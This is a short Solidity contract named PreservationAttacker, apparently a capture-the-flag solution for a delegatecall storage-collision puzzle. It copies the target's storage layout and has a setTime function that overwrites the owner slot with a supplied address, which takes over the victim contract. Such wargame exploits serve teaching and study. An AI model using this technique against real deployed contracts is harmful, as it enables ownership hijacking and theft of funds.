// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract PreservationAttacker {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;

    function setTime(uint256 encodedOwner) public {
        owner = address(uint160(encodedOwner));
    } 
}